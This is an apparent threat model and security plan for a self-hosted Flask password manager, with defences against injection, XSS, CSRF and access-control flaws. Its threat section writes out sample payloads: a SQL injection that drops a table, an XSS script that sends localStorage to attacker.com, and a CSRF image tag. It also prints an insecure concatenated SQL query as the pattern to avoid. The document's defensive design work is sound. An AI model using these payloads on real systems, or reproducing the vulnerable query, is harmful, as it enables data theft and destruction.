# Self-Hosted Password Manager - Security-First Architectural Plan

## Phase 1: Architectural Security Analysis

### 1. Trust Boundaries

**Entry Points (Untrusted User Input):**
- Registration form: `username`, `email`, `password`, `confirm_password`
- Login form: `username`, `password`
- Credentials form: `service_name`, `username`, `password`, `url`
- Search form: `search_query`
- URL parameters: `credential_id` (for edit/delete operations)
- Session tokens (from cookies)

**Critical Boundary Crossing Points:**
1. User input → Database (SQL injection risk)
2. User input → HTML rendering (XSS risk)
3. User input → URL operations (Path traversal/Open redirect risk)
4. Session data → User authorization checks (Access control risk)
5. User input → System operations (Command injection risk - though minimal in this app)

**Privileged Operations:**
- Password hashing/verification (requires timing-safe comparison)
- Session creation/validation (requires secure random tokens)
- Database access (requires parameterized queries)
- Cross-user data access (requires authorization checks on every query)

---

### 2. Threat Modeling

#### 2.1 SQL Injection
**Attack Vector:** User submits malicious SQL in search bar, service name, or credentials
```
Service Name: '); DROP TABLE credentials; --
Search Query: %' OR '1'='1
```
**Impact:** Data exfiltration, deletion, authentication bypass
**Severity:** CRITICAL

#### 2.2 Cross-Site Scripting (XSS)
**Attack Vector:** User stores JavaScript in password or service name field
```
Service Name: <script>fetch('https://attacker.com?data='+localStorage)</script>
```
**Impact:** Session hijacking, credential theft, client-side malware
**Severity:** CRITICAL

#### 2.3 Cross-Site Request Forgery (CSRF)
**Attack Vector:** Attacker tricks logged-in user to visit malicious page that deletes credentials
```
<img src="http://localhost:5000/credential/123/delete">
```
**Impact:** Unauthorized credential deletion/modification
**Severity:** HIGH

#### 2.4 Unauthorized Access / Access Control Bypass
**Attack Vector:** User modifies URL/request to access another user's credentials
```
GET /credential/999/edit?id=999  (if credential 999 belongs to different user)
```
**Impact:** Complete data exposure to other users
**Severity:** CRITICAL

#### 2.5 Weak Password Hashing
**Attack Vector:** Attacker cracks plaintext or weakly-hashed passwords
**Impact:** Compromise of user accounts
**Severity:** CRITICAL

#### 2.6 Brute Force Attack on Login
**Attack Vector:** Attacker tries common passwords in rapid succession
**Impact:** Account compromise
**Severity:** MEDIUM-HIGH

#### 2.7 Session Hijacking
**Attack Vector:** Attacker obtains session cookie (via XSS, network sniffing)
**Impact:** Full account takeover
**Severity:** HIGH

#### 2.8 Information Disclosure via Error Messages
**Attack Vector:** Application reveals whether username exists during registration/login
**Impact:** User enumeration, facilitates targeted attacks
**Severity:** MEDIUM

#### 2.9 Plaintext Password in Memory/Logs
**Attack Vector:** Passwords logged or left in memory
**Impact:** Credential exposure
**Severity:** HIGH

#### 2.10 Open Redirect
**Attack Vector:** Malicious URL in stored URL field, or redirect parameter
**Impact:** Phishing, malware distribution
**Severity:** MEDIUM

---

### 3. Sanitization & Security Controls Strategy

#### 3.1 Input Validation & Sanitization

| Input Field | Validation | Sanitization |
|---|---|---|
| `username` (registration) | 3-20 chars, alphanumeric+underscore, unique | Strip whitespace, lowercase for normalization |
| `email` | Valid email format, unique | Lowercase, strip whitespace |
| `password` | Min 8 chars, min 1 uppercase, 1 digit, 1 special | None (store hashed only) |
| `confirm_password` | Must match password | None (compare before hashing) |
| `service_name` | Max 255 chars, non-empty | HTML escape on output, length limit |
| `username` (credential) | Max 255 chars | HTML escape on output, length limit |
| `password` (credential) | Max 255 chars | HTML escape on output, length limit |
| `url` | Valid URL format or empty | Validate URI scheme (http/https only), HTML escape on output |
| `search_query` | Max 255 chars | SQL parameterization (no manual escaping) |
| `credential_id` | Must be integer, user's own ID | Type casting + authorization check |

#### 3.2 Database Security

**Control: Parameterized Queries (ORM)**
- Use SQLAlchemy ORM exclusively (NO raw SQL)
- All user input passed as parameters, never concatenated into queries
- SQLAlchemy handles proper escaping and parameterization

**Example (Secure):**
```python
user = User.query.filter_by(username=username).first()  # Parameterized
```

**Example (Insecure - AVOIDED):**
```python
user = db.session.execute(f"SELECT * FROM user WHERE username = '{username}'")  # Never do this
```

#### 3.3 Authentication & Password Storage

**Control: Bcrypt Hashing with Salt**
- Use `werkzeug.security.generate_password_hash(password, method='pbkdf2:sha256')` 
  - OR use `bcrypt` library for even stronger hashing
- Never store plaintext passwords
- Never log passwords
- Use timing-safe comparison for verification: `werkzeug.security.check_password_hash()`

#### 3.4 Authorization & Access Control

**Control: Per-Request User Validation**
- Every credential read/edit/delete must verify: `credential.user_id == current_user.id`
- Implement in route before any operation:
```python
credential = Credential.query.get(credential_id)
if not credential or credential.user_id != current_user.id:
    abort(403)  # Forbidden
```

#### 3.5 XSS Prevention

**Control: Jinja2 Auto-escaping**
- Enable auto-escaping in Flask templates (default behavior)
- All `{{ variable }}` expressions automatically HTML-escaped
- Use `|safe` filter ONLY for known-safe HTML (e.g., flash messages from framework)
- Never trust user input marked as `|safe`

**Control: Content Security Policy (Optional Enhancement)**
- Set CSP header to prevent inline scripts

#### 3.6 CSRF Prevention

**Control: Flask-WTF CSRF Tokens**
- Enable CSRF protection globally
- Every form includes `{{ csrf_token() }}`
- All POST/DELETE/PATCH requests validated against token
- Token tied to user session

#### 3.7 Session Security

**Control: Secure Session Configuration**
```python
app.config['SESSION_COOKIE_SECURE'] = True  # HTTPS only
app.config['SESSION_COOKIE_HTTPONLY'] = True  # No JS access
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'  # CSRF protection
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=24)
```

#### 3.8 Rate Limiting

**Control: Flask-Limiter on Login**
- Limit login attempts: max 5 per minute per IP
- Limit registration: max 3 per minute per IP
- Prevents brute force attacks

#### 3.9 Input Length Limits

**Control: Database & Form Constraints**
- Set max length on all string fields at database level
- Validate in forms before submission
- Prevents buffer overflow and DoS attacks

#### 3.10 Information Disclosure Prevention

**Control: Generic Error Messages**
- Login failure: "Invalid username or password" (don't reveal if user exists)
- Registration: "Username already taken" OR "Please use a different username"
- Generic 404/403 pages without sensitive details

#### 3.11 URL Validation for Stored URLs

**Control: Whitelist URL Schemes**
```python
from urllib.parse import urlparse
parsed = urlparse(user_url)
if parsed.scheme not in ['http', 'https', '']:
    raise ValueError("Only HTTP/HTTPS URLs allowed")
```

#### 3.12 Search Implementation

**Control: Parameterized Search with SQLAlchemy**
```python
search_term = f"%{search_query}%"
results = Credential.query.filter(
    Credential.user_id == current_user.id,
    Credential.service_name.ilike(search_term)
).all()
```
- Uses parameterized `ilike()` method
- Scoped to current user (authorization)
- No raw SQL string concatenation

---

### 4. Security Architecture Summary

#### Core Principles:
1. **Parameterized Everything:** All database queries via ORM
2. **Validate Input, Escape Output:** Type validation + HTML escaping in templates
3. **Authorize Every Access:** Check user ownership before any read/write
4. **Hash Passwords:** Bcrypt with salt, never plaintext
5. **Stateless Tokens:** Session-based with secure cookie settings
6. **Fail Closed:** Deny by default, explicit allow for operations
7. **Minimal Privilege:** Users can only access their own data
8. **No Trust in User Input:** Treat all external input as hostile

#### Technology Stack for Security:
- **ORM:** SQLAlchemy (prevents SQL injection)
- **Password Hashing:** werkzeug.security or bcrypt
- **Web Framework:** Flask with Flask-WTF (CSRF protection)
- **Template Engine:** Jinja2 (auto-escaping enabled)
- **Rate Limiting:** Flask-Limiter
- **Database:** SQLite (local storage, no network exposure)

---

## Implementation Checklist (Phase 2)

- [ ] User model with hashed passwords
- [ ] Login/Registration with validation
- [ ] Credential model with user_id foreign key
- [ ] Per-request authorization checks on all credential operations
- [ ] HTML escaping in all templates (Jinja2 auto-escape)
- [ ] CSRF tokens on all forms
- [ ] Parameterized search query
- [ ] Secure session configuration
- [ ] Rate limiting on login/registration
- [ ] Input validation on all forms
- [ ] URL validation for stored URLs
- [ ] Generic error messages
- [ ] Security headers (HTTPS for production)
- [ ] No password logging
- [ ] Password field type="password" in HTML forms

---

**Status:** ✅ Phase 1 Complete - Ready for Phase 2 Implementation
